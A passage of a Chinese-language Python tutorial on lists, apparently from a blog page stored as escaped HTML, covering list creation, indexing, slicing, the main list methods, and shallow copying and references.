class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list.count(<span class=\"number\">1</span>)      <span class=\"comment\">#返回元素1在列表中出现的次数</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"增相关\"><a href=\"#增相关\" class=\"headerlink\" title=\"增相关\"></a><strong>增相关</strong></h4><h5 id=\"append（）-列表最后追加一个元素\"><a href=\"#append（）-列表最后追加一个元素\" class=\"headerlink\" title=\"append（） #列表最后追加一个元素\"></a>append（） #列表最后追加一个元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list.append(<span class=\"string\">'nick'</span>)    <span class=\"comment\">#追加'nick'字符串</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"insert（）-在指定下标处插入一个元素\"><a href=\"#insert（）-在指定下标处插入一个元素\" class=\"headerlink\" title=\"insert（） #在指定下标处插入一个元素\"></a>insert（） #在指定下标处插入一个元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list.insert(<span class=\"number\">2</span>,<span class=\"string\">'sam'</span>)   <span class=\"comment\">#在下标为2的位置插入'sam'元素</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>原来该下标的元素向后推移一个下标</li>\n<li>当要插入的下标大于当前列表长度时，就只是追加在后面，跟append（）一样效果</li>\n</ul>\n<h5 id=\"extend-、-列表合并\"><a href=\"#extend-、-列表合并\" class=\"headerlink\" title=\"extend()、+  #列表合并\"></a>extend()、+  #列表合并</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list1=[<span class=\"number\">1</span>,<span class=\"number\">2</span>]</span><br><span class=\"line\">list2=[<span class=\"number\">3</span>,<span class=\"number\">4</span>]</span><br><span class=\"line\">list3=[<span class=\"number\">5</span>,<span class=\"number\">6</span>]</span><br><span class=\"line\">list4=[<span class=\"number\">7</span>,<span class=\"number\">8</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list1+list2           <span class=\"comment\">#合并列表，得到[1,2,3,4]</span></span><br><span class=\"line\">list3.extend(list4)   <span class=\"comment\">#list4元素追加在list3之后，得到[5,6,7,8]</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>extent()、append()、+的区别在于：前两者是原处修改列表，而+操作是用原列表的复制进行操作。因此原处修改的会更快。</li>\n</ul>\n<h4 id=\"改相关\"><a href=\"#改相关\" class=\"headerlink\" title=\"改相关\"></a><strong>改相关</strong></h4><h5 id=\"索引-分片赋值\"><a href=\"#索引-分片赋值\" class=\"headerlink\" title=\"索引/分片赋值\"></a>索引/分片赋值</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list[<span class=\"number\">1</span>]=<span class=\"number\">5</span>         <span class=\"comment\">#修改下标为1的元素的值</span></span><br><span class=\"line\">list[<span class=\"number\">1</span>:<span class=\"number\">3</span>]=[<span class=\"number\">5</span>,<span class=\"number\">6</span>]   <span class=\"comment\">#切片赋值修改</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>索引赋值和分片赋值都是原处修改。</li>\n<li>分片赋值等号左右两边的元素可不等，即可以切两个元素但只赋值一个元素或任意个元素。</li>\n<li>分片赋值可理解为先删除切片元素，然后执行插入元素操作。</li>\n</ul>\n<h4 id=\"删相关\"><a href=\"#删相关\" class=\"headerlink\" title=\"删相关\"></a><strong>删相关</strong></h4><h5 id=\"remove-删除指定元素\"><a href=\"#remove-删除指定元素\" class=\"headerlink\" title=\"remove() #删除指定元素\"></a>remove() #删除指定元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list.remove(<span class=\"number\">1</span>)    <span class=\"comment\">#删除第一个元素1</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>删除第一个出现的，而不是全部</li>\n</ul>\n<h5 id=\"pop-删除指定下标的元素\"><a href=\"#pop-删除指定下标的元素\" class=\"headerlink\" title=\"pop() #删除指定下标的元素\"></a>pop() #删除指定下标的元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list.pop(<span class=\"number\">2</span>)      <span class=\"comment\">#3会被删除且返回3</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>删除并返回被删除的元素</li>\n<li>不指定元素时，会删除最后一个。</li>\n</ul>\n<h5 id=\"clear-清空列表\"><a href=\"#clear-清空列表\" class=\"headerlink\" title=\"clear() #清空列表\"></a>clear() #清空列表</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list.clear()     <span class=\"comment\">#列表被清空</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"del-删除索引出来的元素\"><a href=\"#del-删除索引出来的元素\" class=\"headerlink\" title=\"del #删除索引出来的元素\"></a>del #删除索引出来的元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">del</span> list[<span class=\"number\">0</span>]       <span class=\"comment\">#下标为0的元素1被删除</span></span><br><span class=\"line\"><span class=\"keyword\">del</span> list[<span class=\"number\">1</span>:<span class=\"number\">3</span>]     <span class=\"comment\">#删除切片元素</span></span><br><span class=\"line\"><span class=\"keyword\">del</span> list          <span class=\"comment\">#删除变量list，整个列表将被删除</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>del是全局的删除，即不是列表的独有方法，可以用于很多对象。</li>\n</ul>\n<h4 id=\"其他方法\"><a href=\"#其他方法\" class=\"headerlink\" title=\"其他方法\"></a><strong>其他方法</strong></h4><h5 id=\"reverse-反转列表元素\"><a href=\"#reverse-反转列表元素\" class=\"headerlink\" title=\"reverse() #反转列表元素\"></a>reverse() #反转列表元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list.reverse()     <span class=\"comment\">#列表变为[3,2,1]</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"sort-永久进行排序\"><a href=\"#sort-永久进行排序\" class=\"headerlink\" title=\"sort() #永久进行排序\"></a>sort() #永久进行排序</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list.sort()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>排序的规则按照ASCII码数值小到大。</li>\n<li>永久排序是因为sort()在原处对列表进行修改。</li>\n<li>一般原处修改操作的都不会有返回值（NONE）</li>\n</ul>\n<h5 id=\"copy-拷贝列表\"><a href=\"#copy-拷贝列表\" class=\"headerlink\" title=\"copy() #拷贝列表\"></a>copy() #拷贝列表</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list1=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,[<span class=\"number\">3</span>,<span class=\"number\">4</span>]]</span><br><span class=\"line\">list2=list1.copy()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>列表的copy()方法是浅copy，只能copy一层，即嵌套的还是共享引用。</li>\n<li>想要迭代copy需要导入copy模块，然后使用copy.deepcopy()方法。</li>\n</ul>\n<h4 id=\"一些理解\"><a href=\"#一些理解\" class=\"headerlink\" title=\"一些理解\"></a><strong>一些理解</strong></h4><ul>\n<li>列表名变量是指向列表对象的引用，列表又是0个或多个对象的引用。列表的浅拷贝实际上列表名变量成为了不同列表对象引用，但他们的列表对象都是指向相同元素对象的引用。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list1=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\">list2=list1.copy()</span><br><span class=\"line\">list3=list1</span><br><span class=\"line\"></span><br><span class=\"line\">id(list1) == id(list2)   <span class=\"comment\">#False</span></span><br><span class=\"line\">list1 <span class=\"keyword\">is</span> list2           <span class=\"comment\">#False</span></span><br><span class=\"line\"></span><br><span class=\"line\">id(list1) == id(list3)   <span class=\"comment\">#True</span></span><br><span class=\"line\">list1 <span class=\"keyword\">is</span> list3           <span class=\"comment\">#True</span></span><br><span class=\"line\"></span><br><span class=\"line\">list1[<span class=\"number\">0</span>] <span class=\"keyword\">is</span> list2[<span class=\"number\">0</span>]     <span class=\"comment\">#True</span></span><br><span class=\"line\">list1[<span class=\"number\">1</span>] <span class=\"keyword\">is</span> list2[<span class=\"number\">1</span>]     <span class=\"comment\">#True</span></span><br><span class=\"line\">     .......</span><br></pre></td></tr></table></figure>\n<ul>\n<li>拷贝让list1和list2成为了不同列表对象的引用，但他们的列表对象都引用着相同的元素对象。修改任意一个列表的元素，实际上只是修改了列表对某个对象的引用而已，因此不会影响到另一个列表(因为两个列表是不同的对象)。</li>\n<li>list3=list1赋值操作，让list3和list1引用了同一个列表对象，因此更改这个列表对象引用的对象，list3与list1都会同时改变。</li>\n</ul>\n<h4 id=\"二次总结\"><a href=\"#二次总结\" class=\"headerlink\" title=\"二次总结\"></a><strong>二次总结</strong></h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>列表是可变的序列。</span><br><span class=\"line\"><span class=\"number\">2.</span>列表是任意对象的有序集合。</span><br><span class=\"line\"><span class=\"number\">3.</span>列表中的元素实质是列表对象引用了一个或多个其他对象。</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">4.</span>强制类型转换：list()  <span class=\"comment\">#操作对象为序列</span></span><br><span class=\"line\"><span class=\"number\">5.</span>列表操作</span><br><span class=\"line\">\t改：</span><br><span class=\"line\">\t\t索引赋值</span><br><span class=\"line\">\t\t  分片赋值：实质是先删除切片内容，再插入赋值的新内容。因此切片赋值不要求左右两边项相等。</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t查：</span><br><span class=\"line\">\t\tindex()    <span class=\"comment\">#返回元素对应的下标</span></span><br><span class=\"line\">\t\tcount()    <span class=\"comment\">#返回元素在列表中的次数</span></span><br><span class=\"line\">\t增：</span><br><span class=\"line\">\t\tappend()   <span class=\"comment\">#在最后追加一个元素（原处修改）。</span></span><br><span class=\"line\">\t\textend()   <span class=\"comment\">#将一个列表追加到另一个列表后面（原处修改）。</span></span><br><span class=\"line\">\t\tinsert()   <span class=\"comment\">#指定下标插入指定元素（原处修改）。</span></span><br><span class=\"line\">\t\t   +       <span class=\"comment\">#序列合并（产生新对象）。</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"> \t删：\t</span><br><span class=\"line\">\t\tremove()        <span class=\"comment\">#从列表中删除指定元素（原处修改）。</span></span><br><span class=\"line\">\t\tpop()           <span class=\"comment\">#删除并弹出指定下标的函数（原处修改），不指定下标则删除并弹出最后一个元素。</span></span><br><span class=\"line\">\t\tclear()         <span class=\"comment\">#清空列表（原处修改）。</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">del</span> list[<span class=\"number\">0</span>]     <span class=\"comment\">#删除索引出来的元素（不是列表特有的，也是原处修改）。</span></span><br><span class=\"line\">  </span><br><span class=\"line\">\t其他：</span><br><span class=\"line\">\t\treverse()   <span class=\"comment\">#翻转列表（原处修改）</span></span><br><span class=\"line\">\t\tsort()      <span class=\"comment\">#排序列表（原处修改）</span></span><br><span class=\"line\">\t\tcopy()      <span class=\"comment\">#浅拷贝</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">6.</span>sort()与sorted()</span><br><span class=\"line\">\tsort()是列表专有的，sorted()是内置函数，对于所有序列都可用</span><br><span class=\"line\">\tsort()是原处修改，sorted()是产生新对象</span><br><span class=\"line\">\treverse()和reversed()也是一样的。</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"0x00-列表概述\"><a href=\"#0x00-列表概述\" class=\"headerlink\" title=\"0x00 列表概述\"></a>0x00 列表概述</h3><ul>\n<li>任意对象的有序集合。</li>\n<li>可任意嵌套。</li>\n<li>属于可变对象类型。</li>\n<li>列表存储了0个或多个对象的引用。</li>\n</ul>","more":"<h3 id=\"0x01-列表创建\"><a href=\"#0x01-列表创建\" class=\"headerlink\" title=\"0x01 列表创建\"></a>0x01 列表创建</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[]</span><br><span class=\"line\">list=[<span class=\"string\">'opaque'</span>,<span class=\"string\">'super'</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\">list=list(<span class=\"string\">'opaque'</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x02-列表操作\"><a href=\"#0x02-列表操作\" class=\"headerlink\" title=\"0x02 列表操作\"></a>0x02 列表操作</h3><h4 id=\"查相关\"><a href=\"#查相关\" class=\"headerlink\" title=\"查相关\"></a><strong>查相关</strong></h4><h5 id=\"索引：按下标索引元素\"><a href=\"#索引：按下标索引元素\" class=\"headerlink\" title=\"索引：按下标索引元素\"></a>索引：按下标索引元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"string\">'opaque'</span>,<span class=\"string\">'super'</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list[<span class=\"number\">0</span>]    <span class=\"comment\">#返回'opaque'</span></span><br><span class=\"line\">list[<span class=\"number\">-1</span>]   <span class=\"comment\">#返回3</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>索引本质是复制。</li>\n<li>左至右下标从0开始往后推。</li>\n<li>右至左下标从-1开始往前推。</li>\n</ul>\n<h5 id=\"切片：按下标切片\"><a href=\"#切片：按下标切片\" class=\"headerlink\" title=\"切片：按下标切片\"></a>切片：按下标切片</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"string\">'opaque'</span>,<span class=\"string\">'super'</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">usage：</span><br><span class=\"line\">    list[start:end:step]</span><br><span class=\"line\">    </span><br><span class=\"line\">example:</span><br><span class=\"line\">    list[<span class=\"number\">0</span>:<span class=\"number\">2</span>]     <span class=\"comment\">#返回['opaque''super']</span></span><br><span class=\"line\">    list[:]       <span class=\"comment\">#返回整个列表</span></span><br><span class=\"line\">    list[<span class=\"number\">1</span>:]      <span class=\"comment\">#返回下标为1到最后的元素列表</span></span><br><span class=\"line\">    list[<span class=\"number\">-3</span>:<span class=\"number\">-1</span>]   <span class=\"comment\">#返回[1,3]</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>步长默认为1</li>\n<li>不指明start表示从下标0开始</li>\n<li>不指明end表示到最后</li>\n<li>切片到end但不包含end</li>\n<li>切片的本质是复制</li>\n<li>切片也是浅拷贝</li>\n</ul>\n<h5 id=\"index-查元素对应下标\"><a href=\"#index-查元素对应下标\" class=\"headerlink\" title=\"index() #查元素对应下标\"></a>index() #查元素对应下标</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"string\">'opaque'</span>,<span class=\"string\">'super'</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\">usage:</span><br><span class=\"line\">    list.index(obj)</span><br><span class=\"line\">example:</span><br><span class=\"line\">    list.index(<span class=\"string\">'opaque'</span>)   <span class=\"comment\">#返回下标0</span></span><br><span class=\"line\">    list.index(<span class=\"number\">1</span>)          <span class=\"comment\">#返回下标2</span></span><br><span class=\"line\">    list[list.index(<span class=\"number\">3</span>)]    <span class=\"comment\">#返回元素3</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"count-查元素出现的次数\"><a href=\"#count-查元素出现的次数\" class=\"headerlink\" title=\"count() #查元素出现的次数\"></a>count() #查元素出现的次数</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list.count(<span class=\"number\">1</span>)      <span class=\"comment\">#返回元素1在列表中出现的次数</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"增相关\"><a href=\"#增相关\" class=\"headerlink\" title=\"增相关\"></a><strong>增相关</strong></h4><h5 id=\"append（）-列表最后追加一个元素\"><a href=\"#append（）-列表最后追加一个元素\" class=\"headerlink\" title=\"append（） #列表最后追加一个元素\"></a>append（） #列表最后追加一个元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list.append(<span class=\"string\">'nick'</span>)    <span class=\"comment\">#追加'nick'字符串</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"insert（）-在指定下标处插入一个元素\"><a href=\"#insert（）-在指定下标处插入一个元素\" class=\"headerlink\" title=\"insert（） #在指定下标处插入一个元素\"></a>insert（） #在指定下标处插入一个元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list.insert(<span class=\"number\">2</span>,<span class=\"string\">'sam'</span>)   <span class=\"comment\">#在下标为2的位置插入'sam'元素</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>原来该下标的元素向后推移一个下标</li>\n<li>当要插入的下标大于当前列表长度时，就只是追加在后面，跟append（）一样效果</li>\n</ul>\n<h5 id=\"extend-、-列表合并\"><a href=\"#extend-、-列表合并\" class=\"headerlink\" title=\"extend()、+  #列表合并\"></a>extend()、+  #列表合并</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list1=[<span class=\"number\">1</span>,<span class=\"number\">2</span>]</span><br><span class=\"line\">list2=[<span class=\"number\">3</span>,<span class=\"number\">4</span>]</span><br><span class=\"line\">list3=[<span class=\"number\">5</span>,<span class=\"number\">6</span>]</span><br><span class=\"line\">list4=[<span class=\"number\">7</span>,<span class=\"number\">8</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list1+list2           <span class=\"comment\">#合并列表，得到[1,2,3,4]</span></span><br><span class=\"line\">list3.extend(list4)   <span class=\"comment\">#list4元素追加在list3之后，得到[5,6,7,8]</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>extent()、append()、+的区别在于：前两者是原处修改列表，而+操作是用原列表的复制进行操作。因此原处修改的会更快。</li>\n</ul>\n<h4 id=\"改相关\"><a href=\"#改相关\" class=\"headerlink\" title=\"改相关\"></a><strong>改相关</strong></h4><h5 id=\"索引-分片赋值\"><a href=\"#索引-分片赋值\" class=\"headerlink\" title=\"索引/分片赋值\"></a>索引/分片赋值</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list[<span class=\"number\">1</span>]=<span class=\"number\">5</span>         <span class=\"comment\">#修改下标为1的元素的值</span></span><br><span class=\"line\">list[<span class=\"number\">1</span>:<span class=\"number\">3</span>]=[<span class=\"number\">5</span>,<span class=\"number\">6</span>]   <span class=\"comment\">#切片赋值修改</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>索引赋值和分片赋值都是原处修改。</li>\n<li>分片赋值等号左右两边的元素可不等，即可以切两个元素但只赋值一个元素或任意个元素。</li>\n<li>分片赋值可理解为先删除切片元素，然后执行插入元素操作。</li>\n</ul>\n<h4 id=\"删相关\"><a href=\"#删相关\" class=\"headerlink\" title=\"删相关\"></a><strong>删相关</strong></h4><h5 id=\"remove-删除指定元素\"><a href=\"#remove-删除指定元素\" class=\"headerlink\" title=\"remove() #删除指定元素\"></a>remove() #删除指定元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list.remove(<span class=\"number\">1</span>)    <span class=\"comment\">#删除第一个元素1</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>删除第一个出现的，而不是全部</li>\n</ul>\n<h5 id=\"pop-删除指定下标的元素\"><a href=\"#pop-删除指定下标的元素\" class=\"headerlink\" title=\"pop() #删除指定下标的元素\"></a>pop() #删除指定下标的元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list.pop(<span class=\"number\">2</span>)      <span class=\"comment\">#3会被删除且返回3</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>删除并返回被删除的元素</li>\n<li>不指定元素时，会删除最后一个。</li>\n</ul>\n<h5 id=\"clear-清空列表\"><a href=\"#clear-清空列表\" class=\"headerlink\" title=\"clear() #清空列表\"></a>clear() #清空列表</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list.clear()     <span class=\"comment\">#列表被清空</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"del-删除索引出来的元素\"><a href=\"#del-删除索引出来的元素\" class=\"headerlink\" title=\"del #删除索引出来的元素\"></a>del #删除索引出来的元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">del</span> list[<span class=\"number\">0</span>]       <span class=\"comment\">#下标为0的元素1被删除</span></span><br><span class=\"line\"><span class=\"keyword\">del</span> list[<span class=\"number\">1</span>:<span class=\"number\">3</span>]     <span class=\"comment\">#删除切片元素</span></span><br><span class=\"line\"><span class=\"keyword\">del</span> list          <span class=\"comment\">#删除变量list，整个列表将被删除</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>del是全局的删除，即不是列表的独有方法，可以用于很多对象。</li>\n</ul>\n<h4 id=\"其他方法\"><a href=\"#其他方法\" class=\"headerlink\" title=\"其他方法\"></a><strong>其他方法</strong></h4><h5 id=\"reverse-反转列表元素\"><a href=\"#reverse-反转列表元素\" class=\"headerlink\" title=\"reverse() #反转列表元素\"></a>reverse() #反转列表元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list.reverse()     <span class=\"comment\">#列表变为[3,2,1]</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"sort-永久进行排序\"><a href=\"#sort-永久进行排序\" class=\"headerlink\" title=\"sort() #永久进行排序\"></a>sort() #永久进行排序</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list.sort()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>排序的规则按照ASCII码数值小到大。</li>\n<li>永久排序是因为sort()在原处对列表进行修改。</li>\n<li>一般原处修改操作的都不会有返回值（NONE）</li>\n</ul>\n<h5 id=\"copy-拷贝列表\"><a href=\"#copy-拷贝列表\" class=\"headerlink\" title=\"copy() #拷贝列表\"></a>copy() #拷贝列表</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list1=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,[<span class=\"number\">3</span>,<span class=\"number\">4</span>]]</span><br><span 